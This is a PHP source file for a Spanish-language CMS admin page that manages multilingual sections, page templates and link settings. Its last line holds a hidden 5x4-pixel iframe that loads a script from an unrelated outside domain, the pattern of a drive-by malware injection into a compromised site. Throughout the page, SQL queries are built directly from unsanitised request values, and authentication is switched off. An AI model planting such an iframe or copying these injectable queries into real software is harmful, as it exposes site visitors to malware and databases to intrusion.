<?
define('authenticate', false);
include_once('../inc/conf.inc.php');

if(!isset($lng_orig)){
	$lng_orig='esp';
} 
if(!isset($lng_dest)){
	$lng_dest='esp';
}
if(!isset($solapa)){
	$solapa=1;
}

$db->select('secciones','min(id_parent) as id_min');
$row=$db->fetch_object();
if($row->id_min != null){
	$id_min=$row->id_min;
}
else{
	$id_min=1;
}

if(!isset($id_parent)){
	$id_parent=$id_min;
}

if($accion==''){
	$db->select('paginas','*',"id=$id_parent");
	if($db->num_rows()>0){
		$row=$db->fetch_object();
		$tipo_vinculo=$row->tipo_vinculo;
		$tipo_ventana=$row->tipo_ventana;
		$tipo_template=$row->tipo_template;
	}
}

if($solapa==1 || !$solapa){
	if($accion=='grabar'){
		$db->update('paginas',"tipo_vinculo=$tipo_vinculo,tipo_ventana=$tipo_ventana,tipo_template=$tipo_template","id=$id_parent");
		$accion='';
	}
/*	elseif($accion==''){
		$db->select('paginas','*',"id=$id_parent");
		if($db->num_rows()>0){
			$row=$db->fetch_object();
			$tipo_vinculo=$row->tipo_vinculo;
			$tipo_ventana=$row->tipo_ventana;
			$tipo_template=$row->tipo_template;
		}
	}*/
}
if($solapa==2){

}

if($accion=='borrar'){
	$db->select('secciones','*',"id=$id");
	if($db->num_rows()>0){
		$row=$db->fetch_object();
		$db->delete('secciones',"id=$id");
	}
	//$db->delete('paginas',"id=$id");
	$accion='';
}

if($accion=='grabar_seccion'){
	if($id==0){
		$db->select('secciones','max(id) as nid');
		$row=$db->fetch_object();
		$id=$row->nid+1;
		$op='nuevo';
	}
	else{
		//echo "<h3>modi id=$id</h3>";
		$op='modi';
	}
	foreach($_POST as $a=>$b){
		if(substr($a,0,6)=='CAMPO_'){
			$c=split('_',$a);
			$$d=$c[1];
			if($$d=='titulo'){	$tit[]=$b; $ln[]=$c[2];}
			if($$d=='descrip'){	$des[]=$b; }
		}
	}
	for($buc=0;$buc<count($tit);$buc++){
		if($op=='nuevo'){
			$act='S_'.$ultimo;
			$db->insert('secciones',"titulo='".$tit[$buc]."', descrip='".$des[$buc]."',lng='".$ln[$buc]."',id=$id,id_parent=$_POST[$act]");
			if($buc==0){
				$db->insert('paginas',"id=$id,tipo_vinculo=$tipo_vinculo,tipo_ventana=$tipo_ventana");
			}
		}
		if($op=='modi'){
			//$db->update('secciones',"titulo='".$tit[$buc]."', descrip='".$des[$buc]."' ,lng='".$ln[$buc]."' and id=$id");
			mysql_query("update secciones set titulo='".$tit[$buc]."', descrip='".$des[$buc]."' where lng='".$ln[$buc]."' and id=$id");
		}
	}
	$accion='';
}

if($accion=='grabarContenido'){
	$db->delete('contenidos',"id=$id_parent");
	foreach($_POST as $a=>$b){
		if(substr($a,0,6)=='CAMPO_'){
			$c=split('_',$a);
			$db->insert('contenidos',"id=$id_parent,lng='$c[2]',campo='$c[0]_$c[1]',contenido='$b'");
		}
	}
	$accion='';
}
if($accion==''){
	$db->select('paginas','*',"id=$id_parent");
	if($db->num_rows()>0){
		$row=$db->fetch_object();
		$tipo_vinculo=$row->tipo_vinculo;
		$tipo_ventana=$row->tipo_ventana;
		$tipo_template=$row->tipo_template;
	}
}

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="../styles/estilo.css" type="text/css">
<script language="JavaScript" type="text/javascript" src="./javascript/download.php"></script>

<script>
function enviar(){
	form.accion.value='graba';
	form.submit();
}
function grabar_seccion(){
	form.accion.value='grabar_seccion';
	form.submit();
}

function seleccion(){
	ids=form.id_origen.value;
	if(!ids) return;
	form.id_parent.value=ids
	form.submit()

}
function atras(x){
	form.id_parent.value=x
	form.submit()

}
function lenguaje(){
	form.submit();
}
function nueva(x,n){
 form.accion.value='frmAlta';
 form.submit();
}
function volver(){
 form.accion.value='';
 form.submit();
}
var contenido_secciones;
var contenido_paginas;

function mostrar(x){

	objeto=document.getElementById('control_secciones')
	boton=document.getElementById('boton_secciones')

	if(objeto.style.visibility=='visible'){
		objeto.style.visibility='hidden';
		contenido_secciones=objeto.innerHTML;
		objeto.innerHTML=''
		boton.value=' 1 '
		form.mostrar_secciones.value=0;
	}
	else{
		objeto.innerHTML=contenido_secciones
		objeto.style.visibility='visible';
		boton.value=' 2 '
		form.mostrar_secciones.value=1;
	}
}
function modificar(){
	y=form.id_origen.value;
	if(!y)return;
	form.id.value=y
	form.accion.value='frmModi';
	form.submit();
}
function borrar(){
	y=form.id_origen.value;
	if(!y)return;
	form.id.value=y
	form.accion.value='borrar';
	form.submit();
}
function solapas(x){
	form.solapa.value=x;
	form.accion.value='';
	form.submit();
}
function grabar_config(){
	form.accion.value='grabar'
	form.submit();
}
function grabarContenido(){
	form.accion.value='grabarContenido'
	form.submit();
}
</script>
</head>

<body topmargin="0" leftmargin="0">

<? 

if($accion=='frmAlta' || $accion=='frmModi'){
		if($accion=='frmModi'){
			$db->select('secciones','*',"id=$id");
			if($db->num_rows()>0){
				while($row=$db->fetch_object()){
					$t["$row->lng"]['titulo']=$row->titulo;
					$t["$row->lng"]['descrip']=$row->descrip;
				}
			}
		}
		else{
			$row->id=0;
			$id=0;
			$row->id_parent=$id_parent;
			$imagen='../img/folder.gif';
		}

?>
<table width="90%"  border="0" align="center" cellpadding="2" cellspacing="2">
  <form name="form" method="post">
    <input type="hidden" name="accion" value="<?=$accion?>">
    <input type="hidden" name="id" value="<?=$id?>">
    <input type="hidden" name="id_parent" value="<?=$id_parent?>">
    <input type="hidden" name="ultimo" value="<?=$ultimo?>">
    <input type="hidden" name="solapa" value="<?=$solapa?>">
	<input type="hidden" name="mostrar_secciones" value="<?=$mostrar_secciones?>">
<?

foreach($_POST as $a => $b){
	if(substr($a,0,2)=='S_'){
		$act=$b;
?>	
	<input type="hidden" name="<?=$a?>" value="<?=$b?>">
<?
	}
}
	
?>

    <tr>
      <td class="titulo_seccion"><div align="left"><strong> &nbsp;<? $txt='ABM de Secciones';include("./traductor.php"); ?></strong></div></td>
      <td class="titulo_seccion">
	    <div align="right">
	      <select name="lng_dest" class="control" onchange="lenguaje()">
		    <?
		$db1=new DBI;
	  	$db1->select('idiomas','*');
		while($row1=$db1->fetch_object()){
			$sel='';
			if($row1->prefijo==$lng_dest)$sel='selected';
		?>
	      <option value="<?=$row1->prefijo?>" <?=$sel?> ><?=$row1->lengua?> </option>
		<?
		}
		?>	  
	    </select> &nbsp;
      </div></td>
    </tr>
    <tr>
      <td height="25" colspan="2"><div align="left">hola</div></td>
    </tr>
    <tr>
      <td height="25" colspan="2">
        <table width="65%"  border="0" cellspacing="2" cellpadding="2" align="center">
          <!--  <tr>
          <td width="29%" class="titulo_seccion"><div align="right"><? $txt='Icono';include("./traductor.php"); ?>
            <img src='<?=$imagen?>' width="20"></div></td>
          <td class="titulo_seccion"><input type="hidden" name="MAX_FILE_SIZE" value="1024000">
            <input type="file" name="archivo" size="65" class="control"></td>
        </tr> -->
          <tr>
            <td colspan="2" class="titulo_seccion">
              <div align="center">
                <input name="Button2" type="button" class="boton" value="<? $txt='Aceptar';include("./traductor.php"); ?>" onClick="grabar_seccion()">
&nbsp;&nbsp;
        <input name="Button2" type="button" class="boton" onClick='volver()' value="<? $txt='Cancelar';include("./traductor.php"); ?>">
              </div>
            </td>
          </tr>
        </table>
      </td>
    </tr>
    <tr>
      <td height="25" colspan="2">
	  <?
	  	$db1->select('idiomas','*');
		while($row1=$db1->fetch_object()){
	  ?>
	  <table width="65%"  border="0" cellspacing="2" cellpadding="2">
        <tr>
          <td align="center" class="titulo_seccion"><div align="center"><img src="../img/<?=$row1->icono?>"></div></td>
		  <td align="center" class="titulo_seccion"><center><span style="color:#FF0000 "><? $msg=$row1->prefijo; echo $msg_error[$msg].'&nbsp;'?></span></center></td>
        </tr>
        <tr>
          <td width="29%" class="titulo_seccion"><div align="right"><? $txt='Titulo';include("./traductor.php"); ?> </div></td>
          <td width="71%"><div align="left">
            <input name="CAMPO_titulo_<?=$row1->prefijo?>" type="text" class="control" id="CAMPO_titulo_<?=$row1->prefijo?>" size="80" maxlength="100" value='<?=$t["$row1->prefijo"]['titulo']?>'>
          </div></td>
        </tr>
        <tr>
          <td class="titulo_seccion"><div align="right"><? $txt='Descripción';include("./traductor.php"); ?></div></td>
          <td><div align="left">
            <textarea name="CAMPO_descrip_<?=$row1->prefijo?>" cols="80" rows="5" class="texto_normal" id="CAMPO_descrip_<?=$row1->prefijo?>"><?=$t["$row1->prefijo"]['descrip']?></textarea>
          </div></td>
        </tr>
		<? } ?>
		</table>
	  </td>
	 </tr>
	  
    
    <tr>
      <td height="25" colspan="2">
	  <table width="65%"  border="0" cellspacing="2" cellpadding="2" align="center">
      <!--  <tr>
          <td width="29%" class="titulo_seccion"><div align="right"><? $txt='Icono';include("./traductor.php"); ?>
            <img src='<?=$imagen?>' width="20"></div></td>
          <td class="titulo_seccion"><input type="hidden" name="MAX_FILE_SIZE" value="1024000">
            <input type="file" name="archivo" size="65" class="control"></td>
        </tr> -->
        <tr>
          <td colspan="2" class="titulo_seccion"><div align="center">
  <input name="Button" type="button" class="boton" value="<? $txt='Aceptar';include("./traductor.php"); ?>" onClick="grabar_seccion()">
&nbsp;&nbsp;
              <input name="Button" type="button" class="boton" onClick='volver()' value="<? $txt='Cancelar';include("./traductor.php"); ?>">
          </div></td>
        </tr>
      </table></td>
    </tr>
  </form>
</table>
<? } ?>

<!--  ADMINISTRADOR  -->

<? if($accion==''){ ?>

<form name="form" method="post">
<input type="hidden" name="id_parent" value="<?=$id_parent?>">
<input type="hidden" name="accion" value="<?=$accion?>">
<input type="hidden" name="id" value="<?=$id?>">
<input type="hidden" name="ultimo" value="<?=$ultimo?>">
<input type="hidden" name="solapa" value="<?=$solapa?>">
<input type="hidden" name="mostrar_secciones" value="<?=$mostrar_secciones?>">
<table width="95%" align="center" class="texto_normal">
	<tr>
	  <td class="titulo_seccion"> <div align="left"><strong> &nbsp;<? $txt='ABM de Secciones';include("./traductor.php"); ?></strong></div>

	  </td>
	  <td class="titulo_seccion">
	    <div align="right">
	      <select name="lng_dest" class="control" onchange="lenguaje()">
		    <?

		$db1=new DBI;
	  	$db1->select('idiomas','*');
		while($row1=$db1->fetch_object()){
			$sel='';
			if($row1->prefijo==$lng_dest)$sel='selected';
		?>
	      <option value="<?=$row1->prefijo?>" <?=$sel?> ><?=$row1->lengua?> </option>
		<?
		}
		?>	  
	    </select> &nbsp;
      </div></td>
	</tr>
	<tr>
		<td colspan="2">
		<input name="button" type="button" class="boton" id="boton_secciones" style="border:1px solid #000000; color:#000000; font-family:Webdings" onClick="mostrar()" value=" 2 ">&nbsp;
		<?

	$w=$id_parent;
	$anidado_cod_ant=$id_min;

	$db->select('secciones','*',"id=$w and id>0 and lng='$lng_dest'");
	if($db->num_rows()>0){
		$row=$db->fetch_object();
		$ww=$row->id_parent;
		$anidado[]=$row->titulo;
		$anidado_cod[]=$row->id;
	
		while($ww>0){
			$db->select('secciones','*',"id=$ww and lng='$lng_dest'");
			while( $row=$db->fetch_object()){
				$anidado[]=$row->titulo;
				$anidado_cod[]=$row->id;
				$ww=$row->id_parent;
			}
		}
	}
	$links='';
	
	for($x=count($anidado);$x>0;$x--){
		$links.="<a href='#' onclick=\"atras('$anidado_cod[$x]')\">".$anidado[$x]."</a>&nbsp;>&nbsp; ";
	}
	$links="<a href='#' onclick=\"atras('$id_min')\">Home</a>&nbsp;&nbsp; ".$links;
	$links.=$anidado[0];
	$titulo_actual=$anidado[0];
	echo $links;

	?>
		</td>
	</tr>
	<tr>
	  <td colspan="2"><hr size="1"></td>
    </tr>

	<tr>
		<td colspan="2">
		<div id="control_secciones" style="visibility:visible;">
		<?
		$db->select('secciones','*',"id_parent=$id_parent and id>0 and lng='$lng_dest'");
		if($db->num_rows()>0){
			$ok_pagina=1;
		?>
			<table width="60%" align="center">
				<tr>
					<td class="boton" onClick="seleccion()" width="30%">
		  				<div align="center">
		  				  <? $txt='Entrar'; include('./traductor.php');?> 
	  				   </div>
					</td>
					<td rowspan="4" class="cuerpo_seccion">
		           <div align="left">
   	          <select name="id_origen" size="5" onDblClick='seleccion()' >
						<?
						while($row=$db->fetch_object()){
							if($id==$row->id){ $sel='selected';}else{$sel='';}
							echo "<option value='$row->id'>".$row->titulo."-".$row->id."</option>";
						}
						?>
   	          </select>
				    </div>
				</td>
			</tr>
				<tr>
				  <td class="boton" onClick="nueva()">
				    <? $txt='Nuevo'; include('./traductor.php');?>
				  </td>
			  </tr>
			<tr>
	  			<td class="boton" onClick="modificar()">
					<div align="center"><? $txt='Modificar'; include('./traductor.php');?></div>
				</td>
	     </tr>
		  <tr>
			  <td class="boton" onClick="alert('NO BORRAR NADA!!!')">
			  		<div align="center"><? $txt='Borrar'; include('./traductor.php');?></div>
				</td>
    	  </tr>
		</table>
		<hr size="1">
		
		</td>
	</tr>
	
				<?
				
				}
				else{
					$ok_pagina=1;
				?>
				<tr>
					<td colspan="2">
						<center><span class="cuerpo_seccion"><br><big><? $txt='No hay subsecciones definidas';include('./traductor.php');?><br>&nbsp;</big></span><hr size="1">
						<input type="button" class="boton" onClick="nueva()" value=" <? $txt='Crear Nueva'; include('./traductor.php');?> "></center>
					</td>
				</tr>
				<? 
				} 
			}
				?>
</table>
<?
if($ok_pagina==1){
?>
<table width="95%" align="center">
<!--<tr>
    <td class="titulo_seccion">
	  <div align="left"><strong> &nbsp;Home: <?= $titulo_actual; ?></strong></div>
</tr>-->
<tr>
	<td>
		<!-- opciones -->
		<table width="98%" align="center" cellpadding="2" cellspacing="0">
			<tr>
				<td width="33%" class="<?= $solapa==1 || !$solapa? 'solapa_sel':'solapa';?>" onClick="solapas(1)"><? $txt='Configuración'; include('./traductor.php');?></td>
				<td width="33%" class="<?= $solapa==2? 'solapa_sel':'solapa';?>" onClick="solapas(2)"><? $txt='Edición'; include('./traductor.php');?></td>
				<td width="33%" class="<?= $solapa==3? 'solapa_sel':'solapa';?>" onClick="solapas(3)"><? $txt='Vista Previa'; include('./traductor.php');?></td>
			</tr>
			<tr><td style=" border:1px solid #000000;border-top:0px solid" colspan="3">
			<? if($solapa==1){ ?>
				<table width="100%">
					<tr><td colspan="4" class="texto_normal"><div align="left"><strong> &nbsp;Home: <?= $titulo_actual; ?></strong></div></td></tr>
					<tr><td colspan="4"><hr size="1" noshade></td></tr>
					<tr>
					<td><big><b>
					  <? $txt='Plantilla'; include('traductor.php');?><br><br></b></big>
					  <? $txt='Especifica el formato en que se muestra la página actual';include('traductor.php');?>
					  </td>
					<td>&nbsp;</td>
					<td class="recuadro">
					  <select name="tipo_template" onChange="grabar_config()">
					<?
						$db->select('templates','*');
						if($db->num_rows()>0){
							while($row=$db->fetch_object()){
								if($row->id==$tipo_template){ $sel='selected';}else{$sel='';}
								echo "<option value=".$row->id." $sel>".$row->nombre."</option>";
							}
						}
					
					?>
					</select></td>
					<td>&nbsp;</td>
					</tr>
					<tr><td colspan="4"><hr size="1" noshade></td></tr>
					<tr>
					  <td width="38%" rowspan="2"><big><b><? $txt='Tipo de vínculos'; include('traductor.php');?></b></big><br> 
					    <br>
					    <? $txt='Especifica la forma en que se mostrarán los vínculos a las subsecciones de la página actual';include('traductor.php');?> </td>
						<td width="3%" rowspan="2">&nbsp;</td>
						<td width="25%" class="recuadro"><div align="left">
						    <label for="tipo_vinculo1">
						    <input name="tipo_vinculo" id="tipo_vinculo1" type="radio" onClick="grabar_config()" value="1" <?= $tipo_vinculo==1 || !$tipo_ventana ? 'checked':'';?>>
						    <? $txt='Lista desplegable';include('traductor.php');?></label></div></td>
						<td width="34%">
						  <div align="left"> &nbsp;&nbsp;(ej:	
						    <select name="select" class="control">
						      <option>Link1</option>
						      <option>Link2</option>
						      <option>Link3</option>
						      </select>)
						  </div>
						</td>
					</tr>
					<tr>
					  <td class="recuadro"><div align="left">
					  	   <label for="tipo_vinculo2">
					  	   <input name="tipo_vinculo" id="tipo_vinculo2" type="radio" value="2" onClick="grabar_config()" <?= $tipo_vinculo==2? 'checked':'';?>>
					  	   Links</label></div></td>
					  <td>
						 <div align="left">&nbsp;&nbsp;(ej.:	<u>Link1</u>	<u>Link2</u> <u>Link3</u> )
				        </div>
					  </td>
				    </tr>
					<tr><td colspan="4"><hr size="1" noshade></td></tr>
					<tr><td rowspan="2"><big><b>
					  <? $txt='Comportamiento del vínculo'; include('traductor.php');?></b></big>
                 <br><br>
                 <? $txt='Selecciona la forma en que se comportará el link al ser activado';include('traductor.php');?><br> 
					</td>
					  <td rowspan="2">&nbsp;</td>
					  <td class="recuadro">
					    <div align="left"><label for="tipo_ventana1">
					    <input name="tipo_ventana" id="tipo_ventana1" type="radio" value="1" onClick="grabar_config()" <?= $tipo_ventana==1|| !$tipo_ventana ? 'checked':'';?>>
					  	<? $txt='En la misma ventana';include('traductor.php');?> </label></div>
					  </td>
					  <td>&nbsp;</td>
					</tr>
					<tr>
					  <td class="recuadro">
					    <div align="left"><label for="tipo_ventana2">
					    <input name="tipo_ventana" id="tipo_ventana2" type="radio" value="2" onClick="grabar_config()" <?= $tipo_ventana==2 ? 'checked':'';?>>
						  	<? $txt='En una nueva ventana';include('traductor.php');?> </label></div>
					  </td>
				     <td>&nbsp;</td>
					</tr>
					<tr><td colspan="4"><hr size="1" noshade></td></tr>
				</table>			
			<? }
			elseif($solapa==2){			
				?>
				<input type="hidden" name="tipo_template" value="<?=$tipo_template?>">
				<table><tr><td>				
				<?

				$db->select('templates','*',"id=$tipo_template");
				if($db->num_rows()>0){
					$row=$db->fetch_object();
					require("../".CFG_templates.$row->archivo);
				}
			 ?>
			</td></tr>
			</table>
			
			
			<? }  
			elseif($solapa==3){ ?>
			<input type="hidden" name="tipo_template" value="<?=$tipo_template?>">
			
			
			<? }
			?>
			</td></tr>
		</table>
		<!-- fin opciones -->
	</td>
</tr>
</table>
<? } ?>
</form>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
